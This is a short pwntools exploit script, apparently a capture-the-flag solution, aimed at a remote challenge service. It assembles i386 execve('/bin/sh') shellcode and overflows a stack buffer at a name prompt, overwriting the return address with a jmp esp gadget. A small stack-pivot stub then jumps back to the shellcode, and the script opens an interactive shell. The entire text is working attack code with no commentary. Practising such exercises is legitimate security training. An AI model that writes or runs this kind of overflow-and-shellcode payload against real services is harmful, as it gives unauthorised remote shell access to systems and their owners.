from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10461)
shellcode = '''
xor eax, eax
xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov al, 0xb
int 0x80
'''
shellcode = asm(shellcode)
# shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

jmp_esp = 0x8048504
sub_esp_jmp = asm('sub esp, 0x28; jmp esp')
payload = shellcode + (0x20-len(shellcode)+4)*b'a' + p32(jmp_esp) + sub_esp_jmp

io.sendlineafter("What's your name?", payload)
io.interactive()